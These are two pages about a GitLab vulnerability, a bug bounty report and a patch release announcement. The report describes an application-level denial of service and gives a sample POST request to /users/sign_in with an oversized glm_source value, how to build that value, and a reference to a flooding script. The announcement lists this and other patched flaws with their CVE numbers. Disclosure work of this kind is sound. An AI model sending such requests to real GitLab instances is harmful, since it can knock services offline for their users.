=== Content from gitlab.com_ef86fed4_20250111_200254.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Application-level Denial of Service via sending a large `glm\_source` parameter

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/engineer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2634880](https://hackerone.com/reports/2634880)** by `sim4n6` on 2024-08-01, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

I identified an application-level denial of service that could be triggered remotely by crafting a specific POST request. Sending such a request to a GitLab instance hosted on a VPS under the stress conditions of DoS leads the instance to reboot some process.

Under the hood, the issue comes from this one [line of code](https://github.com/gitlabhq/gitlabhq/blob/c048ff256b66eaeaa9585c3cc59f3ca1acb7caf8/app/controllers/concerns/preferred_language_switcher.rb#L43) only:

```
    locale = params[:glm_source].scan(%r{(\w{2})-(\w{2})}).flatten
```

What happens here is that the incoming **glm\_source** value is being trusted and a scan() method call is immediately operated on it and then flattened. But no limit on the size is set for the incoming data, this is because the developer expected the value to come from a GET's path request with the limitations that applies.

I managed to weaponize a POST request to meet the conditions to run that specific line of code.

The final proof of concept is **similar** to this one:

```
POST /users/sign_in HTTP/1.1
Host: gitlab.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Cookie: known_sign_in=WWtQSktNOTFacGJyLzR5K3crR245Qzlyc0ZHbmh1VCt4RnBkTlpjWTA5REUrTld6Wk5LbWZUd2tLOVo0eGtiVkJaRlltcU5FVEMrWklMYkkrMDNyTzFVV3ZBUTRCU2NzR2JpVDJGK3ZIbnhraWwxaFFsQ29HbmxMalhYTjNFdEQtLW5mMCtIY3pJUDZZRWNSVXlLNFRsVnc9PQ%3D%3D--4c7291451ca185d6db75c049f30e023099bcab50; hide_no_ssh_message=false; hide_auto_devops_implicitly_enabled_banner_1=false; hide_auto_devops_implicitly_enabled_banner_2=false; _gitlab_session=93d4a1e92ad912e9993df049b59c0eff____ANYTHING;
Accept-Encoding: gzip, deflate, br
Content-Length: 43

_method=get&glm_source=gitlab.com%2Faa-b%2F

```

What is specific about this ordinary POST request is that it does **marketing\_site\_language** in the following [code](https://github.com/gitlabhq/gitlabhq/blob/c048ff256b66eaeaa9585c3cc59f3ca1acb7caf8/app/controllers/concerns/preferred_language_switcher.rb#L16-L21) :

```
  def preferred_language
    cookies[:preferred_language].presence_in(Gitlab::I18n.available_locales) ||
      selectable_language(marketing_site_language) ||
      selectable_language(browser_languages) ||
      Gitlab::CurrentSettings.default_preferred_language
  end
```

Which means :

1. the **preferred\_language** cookie was deleted from the POST request.
2. the header like **Accept-Language: en-US,en;q=0.5** was deleted too.
3. the user is not logged in as the **\_gitlab\_session** cookie corresponds to anything.

When such a POST request hits a GitLab instance the vulnerable line would be triggered and would scan the value of **glm\_source** for all possible locales (strings like `fr-fr` or `jp-JP` or `en-US`) which means any two letters associated with another two letters separated by a hyphen.

Imagine the impact now, if the following python code is used

```
glm_source = "gitlab.com/" + "aa-bb" * 10_000_000 +  "/"
```

it would scan 10 million characters for duo-duo and flatten them inside a list.

##### Steps to reproduce

1. I set up a VPS instance for Gitlab with the following stress conditions:

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/af4c894bd70b2dc333a224b4b339b4534bb765c7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f39363832616633652d323432632d346362352d383638302d6365343736353830623964632f696d6167652e706e67)

to do so:

```
apt-get update
apt-get upgrade -y
apt-get install -y curl openssh-server ca-certificates
curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.deb.sh | bash
apt-get update
EXTERNAL_URL="http://gitlab.example.com" apt-get install gitlab-ee
gitlab-ctl reconfigure
```

and

```
###  add the VPS public IP to the local /etc/hosts so that it can recognize gitlab.example.com to point to the GitLab isntance.

nano /etc/hosts

209.38.64.67            gitlab.example.com
```

After a gitlab instance reconfiguration it would take a while and then you can access it at **gitlab.example.com**.

One more details, the **root** admin password is supposed to be printed to the console otherwise

```
cat /etc/gitlab/initial_root_password
```

use that specific login to create a different user if you want (The point of this step is to showcase that the impact of the attack is on all users).

2. I set up a different VPS instance to emulate a separate attacker's instance.

[![image.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0f1ab7b53bf64c8d85cfb832217d8b21c47a34e9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35306661346334612d343363372d343966362d616535342d3066313634613936643865352f696d6167652e706e67)

3. I hosted the file [![send_DoS.py](data:image/gif;base64...)](https://user-content.gitlab-static.net/dc6f653c64ec8b74f0d60031b925e302329a38e8/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36313234363333632d343366642d343935332d383765372d3839613833316537353662362f73656e645f446f532e7079) in the attacker instance. This python script craft the POST request to hit an instance located at **209.38.64.67** with a command similar to :

```
python3 send_DoS.py 10_000_000
```

for that to be successful, you need to install the python module **aiohttp** on the attacker instance with `pip3 install aiohttp`

##### Impact

When you run the **send\_DoS.py** file on the separate attacker's instance, you shall get something similar to :

[![Screenshot_from_2024-08-01_11-48-24.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/d7d75e9512c1ef417346f4c2bfb3a07d582bad8b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62336365366337642d623432652d346631362d616535382d3861366238306531663033372f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34382d32342e706e67)

The 20 requests sent a minute or so, successfully caused a denial of service.

[![Screenshot_from_2024-08-01_11-48-35.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/066d9df07d5cd20b7d00e0ad69dbbc8d20ccf70d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36653432653561372d383932632d346263382d396161302d6637616139653164316632372f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34382d33352e706e67)[![Screenshot_from_2024-08-01_11-49-01.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/c528ab64c3a97353440f5f77334b695e17e46b8c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f32663733366565332d366564392d343161612d626531362d3134366630343065393831362f53637265656e73686f745f66726f6d5f323032342d30382d30315f31312d34392d30312e706e67)

##### Examples

* If the bug is project related, please create an example project and export it using the project export feature: **nope**
* If you are using an older version of GitLab, this will also help determine whether the bug has been fixed in a more recent version: **latest**.
* If the bug can be reproduced on GitLab.com without violating the `Rules of Engagement` as outlined in the program policy, please provide the full path to the project.: **I did not engage with gitlab.com** but I am sure it is gonna work.

##### What is the current *bug* behavior?

* it causes a denial of service a complete instance disconnect and reboot.

##### What is the expected *correct* behavior?

* the incoming **glm\_source** value should be limited by a maximum of 1\_000 characters.

##### Relevant logs and/or screenshots

* the screenshots are attached above.

##### Output of checks

* If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com : **did not test, but I am willing to do so if you want.**

###### Results of GitLab environment info

* For installations with omnibus-gitlab package run and paste the output of:

  `sudo gitlab-rake gitlab:env:info`

```
System information
System:		Ubuntu 24.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	3.1.5p253
Gem Version:	3.5.11
Bundler Version:2.5.11
Rake Version:	13.0.6
Redis Version:	7.0.15
Sidekiq Version:7.1.6
Go Version:	unknown

GitLab information
Version:	17.2.1-ee
Revision:	88793996279
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	14.11
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.37.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell

Gitaly
- default Address: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
- default Version: 	17.2.1
- default Git Version: 	2.45.2

```

#### Impact

Detailed previously.

Regards

[@]sim4n6

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [image.png](https://h1.sec.gitlab.net/a/9682af3e-242c-4cb5-8680-ce476580b9dc/image.png)
* [image.png](https://h1.sec.gitlab.net/a/50fa4c4a-43c7-49f6-ae54-0f164a96d8e5/image.png)
* [send\_DoS.py](https://h1.sec.gitlab.net/a/6124633c-43fd-4953-87e7-89a831e756b6/send_DoS.py)
* [Screenshot\_from\_2024-08-01\_11-48-24.png](https://h1.sec.gitlab.net/a/b3ce6c7d-b42e-4f16-ae58-8a6b80e1f037/Screenshot_from_2024-08-01_11-48-24.png)
* [Screenshot\_from\_2024-08-01\_11-48-35.png](https://h1.sec.gitlab.net/a/6e42e5a7-892c-4bc8-9aa0-f7aa9e1d1f27/Screenshot_from_2024-08-01_11-48-35.png)
* [Screenshot\_from\_2024-08-01\_11-49-01.png](https://h1.sec.gitlab.net/a/2f736ee3-6ed9-41aa-be16-146f040e9816/Screenshot_from_2024-08-01_11-49-01.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Edited Aug 26, 2024 by [Doug Stull](/dstull)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from about.gitlab.com_fd79b9c4_20250111_200253.html ===


[←
Back to
releases](/releases/categories/releases/)
Sep 11, 2024

-
[Ottilia Westerlund](/company/team/#gitlab)
# GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7

Learn more about GitLab Critical Patch Release: 17.3.2, 17.2.5, 17.1.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

Today we are releasing versions 17.3.2, 17.2.5, 17.1.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to
one of these versions immediately. GitLab.com is already running the patched version. GitLab Dedicated customers do not need to take action.

GitLab releases fixes for vulnerabilities in patch releases. There are two types of patch releases:
scheduled releases, and ad-hoc critical patches for high-severity vulnerabilities. Scheduled releases are released twice a month on the second and fourth Wednesdays.
For more information, you can visit our [releases handbook](https://handbook.gitlab.com/handbook/engineering/releases/) and [security FAQ](https://about.gitlab.com/security/faq/).
You can see all of GitLab release blog posts [here](/releases/categories/releases/).

For security fixes, the issues detailing each vulnerability are made public on our
[issue tracker](https://gitlab.com/gitlab-org/gitlab/-/issues/?sort=created_date&state=closed&label_name%5B%5D=bug%3A%3Avulnerability&confidential=no&first_page_size=100)
30 days after the release in which they were patched.

We are committed to ensuring all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. As part of maintaining good security hygiene, it is highly recommended that all customers
upgrade to the latest patch release for their supported version. You can read more
[best practices in securing your GitLab instance](/blog/2020/05/20/gitlab-instance-security-best-practices/) in our blog post.

### Recommended Action

We **strongly recommend** that all installations running a version affected by the issues described below are **upgraded to the latest version as soon as possible**.

When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, this means all types are affected.

## Security fixes

### Table of security fixes

| Title | Severity |
| --- | --- |
| [Execute environment stop actions as the owner of the stop action job](#execute-environment-stop-actions-as-the-owner-of-the-stop-action-job) | Critical |
| [Prevent code injection in Product Analytics funnels YAML](#prevent-code-injection-in-product-analytics-funnels-yaml) | High |
| [SSRF via Dependency Proxy](#ssrf-via-dependency-proxy) | High |
| [Denial of Service via sending a a specific POST request](#denial-of-service-via-sending-a-specific-post-request) | High |
| [CI\_JOB\_TOKEN can be used to obtain GitLab session token](#ci_job_token-can-be-used-to-obtain-gitlab-session-token) | Medium |
| [Variables from settings are not overwritten by PEP if a template is included](#variables-from-settings-are-not-overwritten-by-pep-if-a-template-is-included) | Medium |
| [Guests can disclose the full source code of projects using custom group-level templates](#guests-can-disclose-the-full-source-code-of-projects-using-custom-group-level-templates) | Medium |
| [IdentitiesController allows linking of arbitrary unclaimed provider identities](#identitiescontroller-allows-linking-of-arbitrary-unclaimed-provider-identities) | Medium |
| [Open redirect in repo/tree/:id endpoint can lead to account takeover through broken OAuth flow](#open-redirect-in-repotreeid-endpoint-can-lead-to-account-takeover-through-broken-oauth-flow) | Medium |
| [Open redirect in release permanent links can lead to account takeover through broken OAuth flow](#open-redirect-in-release-permanent-links-can-lead-to-account-takeover-through-broken-oauth-flow) | Medium |
| [Guest user with Admin group member permission can edit custom role to gain other permissions](#guest-user-with-admin-group-member-permission-can-edit-custom-role-to-gain-other-permissions) | Medium |
| [Exposure of protected and masked CI/CD variables by abusing on-demand DAST](#exposure-of-protected-and-masked-cicd-variables-by-abusing-on-demand-dast) | Medium |
| [Credentials disclosed when repository mirroring fails](#credentials-disclosed-when-repository-mirroring-fails) | Medium |
| [Commit information visible through release atom endpoint for guest users](#commit-information-visible-through-release-atom-endpoint-for-guest-users) | Medium |
| [Dependency Proxy Credentials are Logged in Plaintext in graphql Logs](#dependency-proxy-credentials-are-logged-in-plaintext-in-graphql-logs) | Medium |
| [User Application can spoof the redirect url](#user-application-can-spoof-the-redirect-url) | Low |
| [Group Developers can view group runners information](#group-developers-can-view-group-runners-information) | Low |

### Execute environment stop actions as the owner of the stop action job

An issue was discovered in GitLab CE/EE affecting all versions starting from 8.14 prior to 17.1.7, starting from 17.2 prior to 17.2.5, and starting from 17.3 prior to 17.3.2, which allows an attacker to trigger a pipeline as an arbitrary user under certain circumstances.
This is a critical severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H), 9.9).
It is now mitigated in the latest release and is assigned [CVE-2024-6678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6678).

Thanks [yvvdwf](https://hackerone.com/yvvdwf) for reporting this vulnerability through our HackerOne bug bounty program.

### Prevent code injection in Product Analytics funnels YAML

An issue has been discovered in GitLab EE affecting all versions starting from 16.11 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2. Due to incomplete input filtering, it was possible to inject commands into a connected Cube server.
This is a high severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H), 8.5).
It is now mitigated in the latest release and is assigned [CVE-2024-8640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8640).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### SSRF via Dependency Proxy

A server-side request forgery issue has been discovered in GitLab EE affecting all versions starting from 16.8 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2. It was possible for an attacker to make requests to internal resources using a custom Maven Dependency Proxy URL.
This is a high severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N), 7.7).
It is now mitigated in the latest release and is assigned [CVE-2024-8635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8635).

This vulnerability was discovered internally by GitLab team member [joernchen](https://gitlab.com/joernchen).

### Denial of Service via sending a specific POST request

An issue was discovered in GitLab CE/EE affecting all versions starting from 16.4 prior to 17.1.7, starting from 17.2 prior to 17.2.5, starting from 17.3 prior to 17.3.2 which could cause Denial of Service via sending a specific POST request.
This is a high severity issue ([`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H), 7.5).
It is now mitigated in the latest release and is assigned [CVE-2024-8124](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8124).

Thanks [sim4n6](https://hackerone.com/sim4n6) for reporting this vulnerability through our HackerOne bug bounty program.

### CI\_JOB\_TOKEN can be used to obtain GitLab session token

An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.7 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2. It may have been possible for an attacker with a victim's CI\_JOB\_TOKEN to obtain a GitLab session token belonging to the victim.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:L), 6.7).
It is now mitigated in the latest release and is assigned [CVE-2024-8641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8641).

Thanks [yvvdwf](https://hackerone.com/yvvdwf) for reporting this vulnerability through our HackerOne bug bounty program.

### Variables from settings are not overwritten by PEP if a template is included

An issue was discovered with pipeline execution policies in GitLab EE affecting all versions from 17.2 prior to 17.2.5, 17.3 prior to 17.3.2 which allows authenticated users to bypass variable overwrite protection via inclusion of a CI/CD template.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N), 6.5).
It is now mitigated in the latest release and is assigned [CVE-2024-8311](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8311).

This vulnerability has been discovered internally by GitLab team member [Andy Schoenen](https://gitlab.com/Andyschoenen).

### Guests can disclose the full source code of projects using custom group-level templates

An issue has been discovered in GitLab EE affecting all versions starting from 11.2 before 17.1.7, all versions starting from 17.2 before 17.2.5, all versions starting from 17.3 before 17.3.2. It was possible for a guest to read the source code of a private project by using group templates.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N), 6.5).
It is now mitigated in the latest release and is assigned [CVE-2024-4660](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4660).

Thanks [js\_noob](https://hackerone.com/js_noob) for reporting this vulnerability through our HackerOne bug bounty program.

### IdentitiesController allows linking of arbitrary unclaimed provider identities

An issue has been discovered in GitLab EE/CE affecting all versions from 16.9.7 prior to 17.1.7, 17.2 prior to 17.2.5, and 17.3 prior to 17.3.2. An improper input validation error allows attacker to squat on accounts via linking arbitrary unclaimed provider identities when JWT authentication is configured.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N), 6.4).
We have requested a CVE ID and will update this blog post when it is assigned.

This vulnerability was discovered internally by GitLab team member [Joern Schneeweisz](https://gitlab.com/joernchen).

### Open redirect in repo/tree/:id endpoint can lead to account takeover through broken OAuth flow

An issue has been discovered in GitLab EE affecting all versions starting from 11.1 before 17.1.7, 17.2 before 17.2.5, and 17.3 before 17.3.2. Under certain conditions an open redirect vulnerability could allow for an account takeover by breaking the OAuth flow.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N), 6.4).
It is now mitigated in the latest release and is assigned [CVE-2024-4283](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4283).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### Open redirect in release permanent links can lead to account takeover through broken OAuth flow

An issue has been discovered in GitLab EE affecting all versions starting from 12.9 before 17.1.7, 17.2 before 17.2.5, and 17.3 before 17.3.2. Under certain conditions an open redirect vulnerability could allow for an account takeover by breaking the OAuth flow.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N), 6.4).
It is now mitigated in the latest release and is assigned [CVE-2024-4612](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4612).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### Guest user with Admin group member permission can edit custom role to gain other permissions

A privilege escalation issue has been discovered in GitLab EE affecting all versions starting from 16.6 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2. A user assigned the Admin Group Member custom role could have escalated their privileges to include other custom roles.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:N), 5.5).
It is now mitigated in the latest release and is assigned [CVE-2024-8631](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8631).

Thanks [chotebabume](https://hackerone.com/chotebabume) for reporting this vulnerability through our HackerOne bug bounty program.

### Exposure of protected and masked CI/CD variables by abusing on-demand DAST

An issue was discovered in GitLab EE starting with version 13.3 before 17.1.7, 17.2 before 17.2.5, and 17.3 before 17.3.2 that would allow an attacker to modify an on-demand DAST scan without permissions and leak variables.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N), 5.3).
It is now mitigated in the latest release and is assigned [CVE-2024-2743](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2743).

Thanks [0xn3va](https://hackerone.com/0xn3va) for reporting this vulnerability through our HackerOne bug bounty program.

### Credentials disclosed when repository mirroring fails

An issue has been discovered discovered in GitLab CE/EE affecting all versions starting from 15.10 before 17.1.7, all versions starting from 17.2 before 17.2.5, all versions starting from 17.3 before 17.3.2 will disclose user password from repository mirror configuration.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N), 4.5).
It is now mitigated in the latest release and is assigned [CVE-2024-5435](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5435).

Thanks [gudanggaramfilter](https://hackerone.com/gudanggaramfilter) for reporting this vulnerability through our HackerOne bug bounty program.

### Commit information visible through release atom endpoint for guest users

An issue was discovered in GitLab CE/EE affecting all versions starting with 17.0 before 17.1.7, 17.2 before 17.2.5, and 17.3 before 17.3.2. An attacker as a guest user was able to access commit information via the release Atom endpoint, contrary to permissions.
This is a medium severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N), 4.3).
It is now mitigated in the latest release and is assigned [CVE-2024-6389](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6389).

Thanks [ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for reporting this vulnerability through our HackerOne bug bounty program.

### Dependency Proxy Credentials are Logged in Plaintext in graphql Logs

An issue was discovered in GitLab CE/EE affecting all versions starting from 16.5 prior to 17.1.7, starting from 17.2 prior to 17.2.5, and starting from 17.3 prior to 17.3.2, where dependency proxy credentials are retained in graphql Logs.
This is a medium severity issue ([`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N), 4.0).
It is now mitigated in the latest release and is assigned [CVE-2024-4472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4472).

Thanks [ac7n0w](https://hackerone.com/ac7n0w) for reporting this vulnerability through our HackerOne bug bounty program.

### User Application can spoof the redirect url

An issue has been discovered in GitLab CE/EE affecting all versions starting from 17.1 to 17.1.7, 17.2 prior to 17.2.5 and 17.3 prior to 17.3.2. A crafted URL could be used to trick a victim to trust an attacker controlled application.
This is a low severity issue ([`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N), 3.5).
It is now mitigated in the latest release and is assigned [CVE-2024-6446](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6446).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### Group Developers can view group runners information

An issue was discovered in GitLab CE/EE affecting all versions starting from 16.7 prior to 17.1.7, 17.2 prior to 17.2.5, and 17.3 prior to 17.3.2, where group runners information was disclosed to unauthorised group members.
This is a low severity issue ([`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N`](https://gitlab-com.gitlab.io/gl-security/product-security/appsec/cvss-calculator/explain#explain=CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N), 3.1).
It is now mitigated in the latest release and is assigned [CVE-2024-6685](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6685).

Thanks [ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for reporting this vulnerability through our HackerOne bug bounty program.

## Bug fixes

### 17.3.2

* [UBI: Backport openssl gem pin to 17-3-stable](https://gitlab.com/gitlab-org/build/CNG/-/merge_requests/2012)
* [Backport "Disable allow\_failure for release-environments pipeline"](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163188)
* [Fix issue when resizing images in RTE](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163437)
* [Backport fix for listing projects via API](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163809)
* [Backport lock retries timeout for sliding list strategy to `17-3`](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164228)
* [backport archived filter regression bugfix](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164748)
* [Ensure to update updated\_at when updating access data](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164791)
* [Backport OpenSSL v3 callout to 17.3](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164894)
* [Quarantine pypi package registry spec](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165464)
* [Fix Sidekiq crashing when GITLAB\_LOG\_LEVEL set to debug](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164830)
* [[17.3 Backport] Bump OpenSSL to 3.2.0](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165343)
* [Backport 17.3 - Remove elasticsearch call on init](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165279)
* [Downgrade OpenSSL version to 1.1.1](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7890)
* [[17.3 Backport] Deprecate CentOS 7](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7895)

### 17.2.5

* [Backport "Disable allow\_failure for release-environments pipeline"](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163189)
* [Always build assets image when tagging](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/163421)
* [Update google-cloud-core and google-cloud-env gems](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/162466)
* [Backport to 17.2: Fixes Geo Replication Details incorrectly empty](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/162937)
* [Backport OpenSSL v3 callout to 17.2](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164893)
* [Backport to 17.2: Fix JobArtifactState query timeout](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/164561)
* [CI: Add test basic package functionality before release (17.2 Backport)](https://gitlab.com/gitlab-org/omnibus-gitlab/-/merge_requests/7874)
